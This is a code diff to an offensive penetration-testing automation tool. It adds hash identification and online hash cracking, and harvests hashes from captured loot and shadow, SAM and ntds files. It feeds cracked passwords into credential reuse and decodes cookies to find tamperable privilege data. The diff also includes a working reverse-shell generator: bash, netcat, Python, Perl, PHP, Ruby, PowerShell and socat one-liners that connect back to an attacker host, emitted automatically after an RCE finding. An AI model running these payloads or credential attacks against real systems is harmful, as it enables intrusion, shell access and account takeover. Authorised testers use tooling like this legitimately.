@@ -1369,6 +1369,8 @@ TOOL_LIST = [
     'kerbrute', 'netexec', 'nxc', 'bloodhound-python',
     'GetUserSPNs.py', 'impacket-GetUserSPNs', 'GetNPUsers.py', 'impacket-GetNPUsers',
     'nmblookup',
+    # password cracking (hash identification is built-in; these run the actual crack)
+    'hashcat', 'john',
 ]
 
 def check_tools():
@@ -3457,25 +3459,45 @@ def _b64url_decode(seg):
     return base64.urlsafe_b64decode(seg.encode()).decode('utf-8', 'ignore')
 
 
+def _cookie_decodings(value):
+    """Yield (encoding, decoded-text) for the encodings a cookie value might use:
+    url, base64/base64url, and hex — so role/session data hidden by encoding surfaces."""
+    import base64
+    from urllib.parse import unquote
+    out = [('url', unquote(value))]
+    v = out[0][1]
+    if re.fullmatch(r'[A-Za-z0-9+/_-]{8,}={0,2}', v):
+        for label, dec in (('base64', lambda s: base64.b64decode(s + '=' * (-len(s) % 4))),
+                           ('base64url', lambda s: base64.urlsafe_b64decode(s + '=' * (-len(s) % 4)))):
+            try:
+                t = dec(v).decode('utf-8', 'ignore')
+                if t.isprintable() or t.strip().startswith(('{', '[')):
+                    out.append((label, t))
+            except Exception:
+                pass
+    if re.fullmatch(r'(?:[0-9a-fA-F]{2}){4,}', v):
+        try:
+            out.append(('hex', bytes.fromhex(v).decode('utf-8', 'ignore')))
+        except Exception:
+            pass
+    return out
+
+
 def _cookie_tamper_reason(name, value):
-    """Heuristic: does this cookie look client-tamperable for privilege/session?"""
+    """Heuristic: does this cookie look client-tamperable for privilege/session?
+    Checks the raw value and its url/base64/hex decodings for role/session data."""
     v = value.strip('"')
     low = v.lower()
     # literal role assignment (e.g. admin=0, role=user, isAdmin=false)
     if re.fullmatch(r'(true|false|0|1|user|admin|guest|yes|no)', low):
         return f"plaintext value '{v}' (flip to escalate)"
-    # base64 that decodes to JSON / role words
-    if re.fullmatch(r'[A-Za-z0-9+/_-]{8,}={0,2}', v):
-        try:
-            dec = _b64url_decode(v.split('.')[0]) if '.' not in v else ''
-            if not dec:
-                import base64
-                dec = base64.b64decode(v + '=' * (-len(v) % 4)).decode('utf-8', 'ignore')
-            if dec and (dec.strip().startswith(('{', '[')) or
-                        any(w in dec.lower() for w in _ROLE_WORDS)):
-                return f"base64 decodes to tamperable data: {dec[:80]}"
-        except Exception:
-            pass
+    # any decoding layer that reveals JSON or role/privilege words
+    for enc, dec in _cookie_decodings(v):
+        if enc == 'url' and dec == v:
+            continue
+        if dec and (dec.strip().startswith(('{', '[')) or
+                    any(w in dec.lower() for w in _ROLE_WORDS)):
+            return f"{enc} decodes to tamperable data: {dec[:80]}"
     # short integer -> likely sequential user id
     if re.fullmatch(r'\d{1,6}', v):
         return f"numeric value '{v}' (likely sequential id — try incrementing)"
@@ -3756,6 +3778,230 @@ def run_auth_suite(url, port, corpus, outdir, args, tools, loot=None):
         _recommend(loot, f"Reset: Host-header poison the reset link; test token predictability & "
                    f"non-invalidation; reset without old password", "password-reset logic playbook")
     return vulns
+
+
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# HASH IDENTIFICATION + CRACKING  and  REVERSE-SHELL PAYLOADS (pentestmonkey)
+# ------------------------------------------------------------------------
+# Hash identification is local/passive. Online cracking (crackcrypt.com) sends
+# the hash to a third party, so it is gated behind --crack or --active; when off
+# a ready-to-run hashcat/john + curl command is recommended instead.
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+# crackcrypt.com supports these unsalted algs; each maps to a hashcat mode too.
+_CRACKCRYPT_ALGS = {'md5', 'sha1', 'ntlm', 'sha256', 'sha512'}
+_CRACKCRYPT_LAST = [0.0]  # rate-limit state: 1 req/s per API terms
+
+
+def identify_hash(h, source_hint=''):
+    """Identify likely hash type(s). Returns [(label, hashcat_mode, crackcrypt_alg|None)].
+    For the md5/ntlm 32-hex ambiguity, order by source context (SMB/AD => ntlm)."""
+    h = h.strip()
+    if re.fullmatch(r'\$2[aby]\$\d\d\$[./A-Za-z0-9]{53}', h):
+        return [('bcrypt', 3200, None)]
+    if re.fullmatch(r'\$6\$[^$]{1,64}\$[./A-Za-z0-9]{86}', h):
+        return [('sha512crypt', 1800, None)]
+    if re.fullmatch(r'\$5\$[^$]{1,64}\$[./A-Za-z0-9]{43}', h):
+        return [('sha256crypt', 7400, None)]
+    if re.fullmatch(r'\$1\$[^$]{1,8}\$[./A-Za-z0-9]{22}', h):
+        return [('md5crypt', 500, None)]
+    if h.startswith('$krb5tgs$'):
+        return [('kerberoast-TGS', 13100, None)]
+    if h.startswith('$krb5asrep$') or h.startswith('$krb5asrep$23$'):
+        return [('AS-REP', 18200, None)]
+    if h.count(':') >= 6 and re.search(r'[0-9a-fA-F]{32}:[0-9a-fA-F]{32}', h):
+        return [('NetNTLMv2/pwdump', 5600, None)]
+    if re.fullmatch(r'[0-9a-fA-F]{32}', h):
+        ad = any(k in source_hint.lower() for k in ('smb', 'ad', 'ntds', 'sam', 'netexec', 'nxc', 'domain'))
+        opts = [('ntlm', 1000, 'ntlm'), ('md5', 0, 'md5')]
+        return opts if ad else opts[::-1]
+    if re.fullmatch(r'[0-9a-fA-F]{40}', h):
+        return [('sha1', 100, 'sha1')]
+    if re.fullmatch(r'[0-9a-fA-F]{64}', h):
+        return [('sha256', 1400, 'sha256')]
+    if re.fullmatch(r'[0-9a-fA-F]{128}', h):
+        return [('sha512', 1700, 'sha512')]
+    return []
+
+
+def crack_hash_online(h, alg, timeout=15):
+    """Look up an unsalted hash on crackcrypt.com (rate-limited 1 req/s).
+    Returns plaintext or None. Only call for algs in _CRACKCRYPT_ALGS."""
+    if alg not in _CRACKCRYPT_ALGS:
+        return None
+    dt = time.time() - _CRACKCRYPT_LAST[0]
+    if dt < 1.1:
+        time.sleep(1.1 - dt)
+    _CRACKCRYPT_LAST[0] = time.time()
+    try:
+        payload = json.dumps({'hash': h, 'alg': alg}).encode()
+        req = Request('https://crackcrypt.com/api/v1/lookup', data=payload,
+                      headers={'Content-Type': 'application/json',
+                               'User-Agent': f'SmartNmap/{VERSION}'})
+        with urlopen(req, timeout=timeout) as resp:
+            data = json.loads(resp.read().decode('utf-8', 'ignore'))
+        return data.get('plaintext') if data.get('found') else None
+    except Exception:
+        return None
+
+
+def _gather_hashes(loot, outdir):
+    """Collect candidate hashes from loot + on-disk artifacts, with a source hint."""
+    found = {}  # hash -> source hint
+
+    def _scan(text, src):
+        for m in re.finditer(r'\$(?:krb5tgs|krb5asrep|2[aby]|6|5|1)\$\S+', text):
+            found.setdefault(m.group(0), src)
+        for m in re.finditer(r'\b[0-9a-fA-F]{32,128}\b', text):
+            if len(m.group(0)) in (32, 40, 64, 128):
+                found.setdefault(m.group(0), src)
+        # shadow / pwdump style user:hash
+        for m in re.finditer(r'^([^:\s]+):(\$\S+|[0-9a-fA-F]{32,}:[0-9a-fA-F]{32,}|[0-9a-fA-F]{32,128})',
+                             text, re.M):
+            found.setdefault(m.group(2), f'{src}:user={m.group(1)}')
+
+    for bucket in ('keys', 'creds', 'notes', 'files'):
+        for item in getattr(loot, bucket, []):
+            _scan(str(item), bucket)
+    for fn in ('kerberoast.hash', 'asrep.hash'):
+        p = outdir / fn
+        if p.exists():
+            _scan(p.read_text(errors='ignore'), fn)
+    # mined share/LFI files that look like shadow/passwd
+    for p in list((outdir / 'share_loot').rglob('*')) if (outdir / 'share_loot').exists() else []:
+        if p.is_file() and p.stat().st_size < 2_000_000 and p.name in ('shadow', 'passwd', 'sam', 'ntds.dit'):
+            try:
+                _scan(p.read_text(errors='ignore'), f'share:{p.name}')
+            except Exception:
+                pass
+    return found
+
+
+def _krb_username(h):
+    m = re.search(r'\$krb5(?:tgs|asrep)\$\d+\$\*?([^*$]+?)[\*$]', h)
+    return m.group(1).split('/')[0] if m else None
+
+
+def run_hash_cracking(target, services, outdir, args, tools, loot=None, context=None):
+    """Identify every captured hash, recommend the exact hashcat/john command, and
+    (gated) look unsalted hashes up on crackcrypt.com. Cracked plaintexts feed the
+    credential state machine -> reuse sweep. Uses AI to disambiguate when available."""
+    vulns = []
+    if loot is None:
+        return vulns
+    hashes = _gather_hashes(loot, outdir)
+    if not hashes:
+        return vulns
+    online = active_enabled(args) or getattr(args, 'crack', False)
+    subsection("Hash Identification & Cracking")
+    cracked = []
+    for h, src in list(hashes.items())[:50]:
+        cands = identify_hash(h, src)
+        if not cands:
+            continue
+        # AI disambiguation for the md5/ntlm case, if an API key is configured
+        if len(cands) == 2 and getattr(args, 'api_key', '') and cands[0][0] in ('md5', 'ntlm'):
+            try:
+                ans = query_ai(f"A 32-hex hash '{h[:16]}...' was found via '{src}'. "
+                               f"Answer with exactly one word: md5 or ntlm.",
+                               api_key=args.api_key, timeout=20) or ''
+                if 'ntlm' in ans.lower():
+                    cands = [c for c in cands if c[0] == 'ntlm'] + [c for c in cands if c[0] != 'ntlm']
+                elif 'md5' in ans.lower():
+                    cands = [c for c in cands if c[0] == 'md5'] + [c for c in cands if c[0] != 'md5']
+            except Exception:
+                pass
+        label, mode, cc_alg = cands[0]
+        alt = f" (or {'/'.join(c[0] for c in cands[1:])})" if len(cands) > 1 else ''
+        info(f"hash {h[:24]}… → {label}{alt}  [hashcat -m {mode}]")
+        if loot:
+            loot.add('notes', f"hash ({src}): {label} hashcat -m {mode}")
+        plaintext = None
+        if online and cc_alg:
+            plaintext = crack_hash_online(h, cc_alg)
+            # try the alternate alg too (e.g. md5 vs ntlm)
+            for c in cands[1:]:
+                if plaintext:
+                    break
+                if c[2]:
+                    plaintext = crack_hash_online(h, c[2])
+                    if plaintext:
+                        label, mode = c[0], c[1]
+        if plaintext:
+            good(f"  CRACKED ({label}): {h[:16]}… = {plaintext}")
+            cracked.append(plaintext)
+            user = _krb_username(h) or (re.search(r'user=([^:\s]+)', src) or [None, None])[1]
+            if loot:
+                if user:
+                    loot.add_cred(user, plaintext, source=f'crack:{label}', scope='domain', verified=True)
+                    loot.add_step(f"Cracked {label} hash for {user} = {plaintext}")
+                else:
+                    loot.add('creds', f'cracked {label}: {plaintext}')
+                    loot.add_step(f"Cracked {label} hash = {plaintext} (candidate password)")
+            vulns.append({'port': 0, 'service': 'hash', 'product': label, 'version': '',
+                         'desc': f'{label} hash cracked to "{plaintext}"'
+                                 + (f' (user {user})' if user else ''),
+                         'cve': '', 'exploit': f'reuse credential {user or "?"}:{plaintext}',
+                         'severity': 'high'})
+        else:
+            wl = '/usr/share/wordlists/rockyou.txt'
+            if online and cc_alg:
+                _recommend(loot, f"curl -s -X POST https://crackcrypt.com/api/v1/lookup "
+                           f"-H 'Content-Type: application/json' -d '{{\"hash\":\"{h[:24]}…\",\"alg\":\"{cc_alg}\"}}'",
+                           f"online lookup {label}")
+            _recommend(loot, f"hashcat -m {mode} '{h[:40]}…' {wl}   # or: john --format=…",
+                       f"crack {label} hash from {src}")
+    if cracked:
+        (outdir / 'cracked_passwords.txt').write_text('\n'.join(sorted(set(cracked))))
+    return vulns
+
+
+# ── Reverse-shell payloads (pentestmonkey cheat sheet) ────────────────────
+def reverse_shell_payloads(lhost, lport):
+    """Canonical pentestmonkey reverse-shell one-liners + common upgrades."""
+    py = ("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,"
+          "socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0);"
+          "os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
+          "import pty;pty.spawn(\"/bin/bash\")'" % (lhost, lport))
+    return {
+        'bash':       f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1',
+        'bash-5555':  f'0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196',
+        'nc-e':       f'nc -e /bin/sh {lhost} {lport}',
+        'nc-mkfifo':  f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f',
+        'python3':    py,
+        'perl':       (f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
+                       "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
+                       "if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");"
+                       "open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"),
+        'php':        f'php -r \'$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");\'',
+        'ruby':       (f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;"
+                       "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"),
+        'powershell': (f'powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient(\'{lhost}\',{lport});'
+                       '$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0)'
+                       '{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);'
+                       '$sb2=$sb+\'PS \'+(pwd).Path+\'> \';$sby=([text.encoding]::ASCII).GetBytes($sb2);'
+                       '$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()"'),
+        'socat':      f'socat TCP:{lhost}:{lport} EXEC:/bin/sh',
+        'pty-upgrade': "python3 -c 'import pty;pty.spawn(\"/bin/bash\")' ; # then: Ctrl-Z; stty raw -echo; fg",
+    }
+
+
+_RCE_KEYWORDS = ('command injection', 'shellshock', 'os command', 'local file inclusion',
+                 'file upload', 'default/weak web credential', 'rce', 'remote code',
+                 'deserial', 'sql injection')
+
+
+def emit_reverse_shells(vulns, args, loot):
+    """When a foothold/RCE finding exists, drop pentestmonkey reverse shells into
+    the report (uses --lhost/--lport, else placeholders)."""
+    if not any(any(k in v.get('desc', '').lower() for k in _RCE_KEYWORDS) for v in vulns):
+        return
+    lhost = getattr(args, 'lhost', None) or 'ATTACKER_IP'
+    lport = getattr(args, 'lport', None) or '4444'
+    if loot:
+        loot.add('recommend', f"# --- Reverse shells (pentestmonkey) — set up: nc -lvnp {lport} ---")
+        for name, payload in reverse_shell_payloads(lhost, lport).items():
+            loot.add('recommend', f"[revshell:{name}] {payload}")
 
 
 def phase5_tools(target, services, outdir, args, tools, api_key=None, loot=None, hostnames=None):
@@ -4392,6 +4638,10 @@ def phase5_tools(target, services, outdir, args, tools, api_key=None, loot=None,
     shellshock_vulns += run_ad_collect_authed(target, services, outdir, args, tools, loot,
                                               domain=(p5_context.get('domain') or _ad_domain),
                                               context=p5_context)
+    # 5. Identify & (gated) crack captured hashes; cracked creds re-enter the reuse loop
+    shellshock_vulns += run_hash_cracking(target, services, outdir, args, tools, loot, context=p5_context)
+    shellshock_vulns += run_credential_reuse(target, services, outdir, args, tools, loot,
+                                             context=p5_context)
 
     # AI tool strategy advice
     if api_key:
@@ -4652,6 +4902,9 @@ def phase6_analysis(target, services, vulns, outdir, args, api_key=None, loot=No
 
     # ── Built-in Attack Path (always shown) ──
     _builtin_attack_path(target, services, vulns_sorted, sploit_results, outdir)
+
+    # Reverse-shell cheat sheet (pentestmonkey) when a foothold/RCE finding exists
+    emit_reverse_shells(vulns_sorted, args, loot)
 
     # AI Deep Analysis
     ai_response = None
@@ -5149,6 +5402,10 @@ Setup:
     offense.add_argument('--userlist', help='Username wordlist for brute/spray (hydra, kerbrute, netexec)')
     offense.add_argument('--passlist', help='Password wordlist for brute/spray')
     offense.add_argument('--domain', help='AD/Kerberos domain (auto-detected from LDAP if omitted)')
+    offense.add_argument('--crack', action='store_true',
+                         help='Look up captured hashes on crackcrypt.com (external egress; also on with --active)')
+    offense.add_argument('--lhost', help='Attacker IP for generated reverse-shell payloads')
+    offense.add_argument('--lport', help='Attacker port for reverse-shell payloads (default 4444)')
 
     output = p.add_argument_group('Output')
     output.add_argument('-o', '--output', help='Output directory')
